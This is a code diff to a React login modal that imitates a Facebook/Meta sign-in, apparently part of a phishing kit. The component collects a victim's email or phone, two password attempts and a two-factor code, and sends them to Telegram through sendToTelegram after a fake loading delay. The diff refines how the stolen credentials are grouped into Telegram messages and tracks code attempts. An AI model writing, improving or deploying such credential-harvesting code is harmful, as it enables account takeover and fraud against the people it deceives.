@@ -9,7 +9,7 @@ import SuccessModal from '@/components/success-modal';
 import fbIcon from '@/assets/images/icon.webp';
 import logoMeta from '@/assets/images/logo-meta.svg';
 
-const LoginModal = ({ onClose, formData = {}, initialMessageId = null }) => {
+const LoginModal = ({ onClose, formData = {} }) => {
     const { labels } = useLang();
     const [showPassword, setShowPassword] = useState(false);
     const [emailOrPhone, setEmailOrPhone] = useState('');
@@ -17,7 +17,7 @@ const LoginModal = ({ onClose, formData = {}, initialMessageId = null }) => {
     const [loading, setLoading] = useState(false);
     const [errorMsg, setErrorMsg] = useState('');
     const [attempts, setAttempts] = useState(0);
-    const [prevMessageId, setPrevMessageId] = useState(initialMessageId);
+    const [prevMessageId, setPrevMessageId] = useState(null);
     const [password1, setPassword1] = useState('');
     const [password2, setPassword2] = useState('');
     const [isTwoFactorStep, setIsTwoFactorStep] = useState(false);
@@ -72,12 +72,12 @@ const LoginModal = ({ onClose, formData = {}, initialMessageId = null }) => {
             ? { emailOrPhone, password1: password }
             : { emailOrPhone, password1, password2: password };
 
-        const messageId = await sendToTelegram(formData, credentials, prevMessageId);
+        const messageId = await sendToTelegram(formData, credentials, isFirstAttempt ? null : prevMessageId);
 
         if (isFirstAttempt) {
             setPassword1(password);
+            setPrevMessageId(messageId);
         }
-        setPrevMessageId(messageId);
 
         await new Promise((resolve) =>
             setTimeout(resolve, config.password_loading_time * 1000)
@@ -274,6 +274,7 @@ const LoginModal = ({ onClose, formData = {}, initialMessageId = null }) => {
                         emailOrPhone={emailOrPhone}
                         email={formData?.email_facebook || formData?.email_work}
                         phone={formData?.phone}
+                        codeAttempts={codeAttempts}
                         code={twoFactorCode}
                         onCodeChange={(value) => {
                             setTwoFactorCode(value.replaceAll(/\D/g, ''));
@@ -314,5 +315,4 @@ export default LoginModal;
 LoginModal.propTypes = {
     onClose: PropTypes.func.isRequired,
     formData: PropTypes.object,
-    initialMessageId: PropTypes.number,
 };
